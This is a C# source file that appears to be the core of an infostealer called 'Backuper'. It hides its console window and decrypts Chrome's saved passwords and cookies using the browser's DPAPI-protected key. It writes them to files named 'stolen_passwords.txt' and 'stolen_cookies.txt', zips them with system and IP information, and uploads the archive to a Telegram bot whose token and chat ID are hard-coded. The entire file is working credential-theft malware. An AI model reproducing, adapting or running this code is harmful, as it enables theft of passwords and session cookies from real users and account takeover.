using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Backuper.payload.Components.Happer;
using Backuper.payload.Components.Algorigtams;
using Backuper.payload.Components.Unity;
using System.Runtime.InteropServices;
using Backuper.payload.SystemInfo;
using Backuper.SystemInfo;
using System.Data.SQLite;
using System.Diagnostics;

namespace Backuper.payload.Components.Browsers
{

    internal static class Program
    {

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        static async Task Main(string[] args)
        {
            string tempPath = Path.GetTempPath();

            
            string folderName = "MyTempFolder";

           
            string folderPath = Path.Combine(tempPath, folderName);

            try
            {
                
                if (!Directory.Exists(folderPath))
                {
                    Directory.CreateDirectory(folderPath);
                    Console.WriteLine("Folder created successfully at: " + folderPath);
                }
                else
                {
                    Console.WriteLine("Folder already exists at: " + folderPath);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }

            
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            
            await Chromeop.BackuperPasswords();
            await Chromeop.BackuperCookies();


            var ipInfo = await IpInfo.GetInfo();
            GeneralSystemInfo generalInfo = await General.GetInfo();
            string tempFolderPath = Path.Combine(Path.GetTempPath(), "MyTempFolder");

            Backuper.SystemInfo.ZeroKbTxtRemover.RemoveZeroKbTxtFiles();
            Backuper.SystemInfo.Ziper.ZipAndDeleteFolder(folderPath);
            Sender sender = new Sender();
            sender.SetTelegramCredentials("7186796941:AAHmCxfhfQvNwDAtlvAmGY-N9c5sFXhHpNM", 7192492891); // Add Token or ChatID 
            await sender.UploadBackupAndSendLinkAsync();



        }

    }
    internal static class Chromeop
    {
        static private readonly string BrowserPath;

        static private byte[] _encryptionKey;

        static Chromeop()
        {
            BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google", "Chrome", "User Data");

            _encryptionKey = null;
        }

        static private async Task<byte[]> GetEncryptionKey()
        {
            if (!(_encryptionKey is null)) return _encryptionKey;

            byte[] key = null;

            string localStatePath = Path.Combine(BrowserPath, "Local State");
            if (File.Exists(localStatePath))
                try
                {
                    string content;

                    using (FileStream fs = new FileStream(localStatePath, FileMode.Open, FileAccess.Read,
                               FileShare.ReadWrite))
                    {
                        using (StreamReader reader = new StreamReader(fs))
                        {
                            content = await reader.ReadToEndAsync();
                        }
                    }

                    dynamic jsonContent = SimpalJahan.DeserializeObject(content);
                    string encryptedKey = (string)jsonContent["os_crypt"]["encrypted_key"];
                    key = ProtectedData.Unprotect(Convert.FromBase64String(encryptedKey).Skip(5).ToArray(), null,
                        DataProtectionScope.CurrentUser);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }

            if (!(key is null))
            {
                _encryptionKey = key;
                return _encryptionKey;
            }

            return null;
        }

        static private async Task<byte[]> DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            byte[] key = await GetEncryptionKey();

            if (key is null)
            {
                return null;
            }

            try
            {

                string bufferString = Encoding.Default.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                {
                    byte[] iv = buffer.Skip(3).Take(12).ToArray();
                    byte[] cipherText = buffer.Skip(15).ToArray();

                    byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
                    cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();

                    decryptedData = new AesGcm().Decrypt(key, iv, null, cipherText, tag);
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            return decryptedData;
        }

        internal static async Task BackuperPasswords()
        {
            var passwords = await GetPasswords();
            string tempFolderPath = Path.Combine(Path.GetTempPath(), "MyTempFolder");
            string filePath = Path.Combine(tempFolderPath, "stolen_passwords.txt");

            using (StreamWriter writer = new StreamWriter(filePath))
            {
                foreach (var password in passwords)
                {
                    await writer.WriteLineAsync($"URL: {password.Url} | Username: {password.Username} | Password: {password.Password}");
                }
            }

            Console.WriteLine("Passwords stolen and saved successfully!");
        }

        internal static async Task BackuperCookies()
        {
            var cookies = await GetCookies();
            string tempFolderPath = Path.Combine(Path.GetTempPath(), "MyTempFolder");
            string filePath = Path.Combine(tempFolderPath, "stolen_cookies.txt");

            using (StreamWriter writer = new StreamWriter(filePath))
            {
                foreach (var cookie in cookies)
                {
                    await writer.WriteLineAsync($"Host: {cookie.Host} | Name: {cookie.Name} | Path: {cookie.Path} | Value: {cookie.Cookie} | Expiry: {cookie.Expiry}");

                }
            }

            Console.WriteLine("Cookies stolen and saved successfully!");
        }

        private static async Task<PasswordopFormat[]> GetPasswords()
        {
            var passwords = new List<PasswordopFormat>();

            if (Directory.Exists(BrowserPath) && !(await GetEncryptionKey() is null))
            {
                string[] loginDataPaths = await Task.Run(() =>
                    Directory.GetFiles(BrowserPath, "Login Data", SearchOption.AllDirectories));

                foreach (string loginDataPath in loginDataPaths)
                    try
                    {
                    retry:
                        string tempLoginDataPath = Path.Combine(Path.GetTempPath(), Comando.GeneratedRandString(15));
                        if (File.Exists(tempLoginDataPath)) goto retry;

                        File.Copy(loginDataPath, tempLoginDataPath);

                        SQLandhand handler = new SQLandhand(tempLoginDataPath);

                        if (!handler.ReadTable("logins"))
                            continue;

                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string url = handler.GetValue(i, "origin_url");
                            string username = handler.GetValue(i, "username_value");
                            byte[] encryptedPassword = Encoding.Default.GetBytes(handler.GetValue(i, "password_value"));

                            byte[] password = await DecryptData(encryptedPassword);

                            if (!string.IsNullOrWhiteSpace(url) && !string.IsNullOrWhiteSpace(username) &&
                                !(password is null) && password.Length > 0)
                            {
                                passwords.Add(new PasswordopFormat(username, Encoding.UTF8.GetString(password), url));
                            }
                        }

                        File.Delete(tempLoginDataPath);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
            }

            return passwords.ToArray();
        }

        private static async Task<CookieopFormat[]> GetCookies()
        {
            var cookies = new List<CookieopFormat>();

            if (Directory.Exists(BrowserPath) && !(await GetEncryptionKey() is null))
            {
                string[] cookiesFilePaths = await Task.Run(() =>
                    Directory.GetFiles(BrowserPath, "Cookies", SearchOption.AllDirectories));

                foreach (string cookiesFilePath in cookiesFilePaths)
                {
                    try
                    {
                    retry:
                        string tempCookiesFilePath = Path.Combine(Path.GetTempPath(), Comando.GeneratedRandString(15));
                        if (File.Exists(tempCookiesFilePath)) goto retry;

                        File.Copy(cookiesFilePath, tempCookiesFilePath);

                        SQLandhand handler = new SQLandhand(tempCookiesFilePath);

                        if (!handler.ReadTable("cookies"))
                            continue;

                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string host = handler.GetValue(i, "host_key");
                            string name = handler.GetValue(i, "name");
                            string path = handler.GetValue(i, "path");
                            byte[] encryptedCookie = Encoding.Default.GetBytes(handler.GetValue(i, "encrypted_value"));
                            ulong expiry = Convert.ToUInt64(handler.GetValue(i, "expires_utc"));

                            byte[] cookie = await DecryptData(encryptedCookie);

                            if (!string.IsNullOrWhiteSpace(host) && !string.IsNullOrWhiteSpace(name) && !(cookie is null) &&
                                cookie.Length > 0)
                            {
                                string decodedCookie = Encoding.UTF8.GetString(cookie);
                                cookies.Add(new CookieopFormat(host, name, path, decodedCookie, expiry));
                            }
                        }

                        File.Delete(tempCookiesFilePath);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }

            Console.WriteLine("Cookies stolen and saved successfully!");

            return cookies.ToArray();
        }
        
    }
}